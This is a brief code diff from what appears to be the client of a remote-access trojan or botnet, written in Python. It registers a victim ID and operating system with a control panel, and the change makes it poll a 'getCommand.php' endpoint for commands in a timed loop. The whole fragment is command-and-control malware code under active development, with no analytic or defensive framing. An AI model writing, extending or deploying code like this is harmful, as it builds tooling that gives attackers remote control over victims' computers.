@@ -20,7 +20,7 @@ requests.get(url = PanelURL + "connection.php", params = {'VicID': uid,'os': oss
 
 count = 0
 while (count == 0):
-   commands = requests.get(PanelURL + "/Clients/" + uid + ".txt")
+   commands = requests.get(PanelURL + "/getCommand.php?id=" + uid)
    splitcommand = commands.text.split("|BN|")
    time.sleep(10)
    if splitcommand[0] == '':
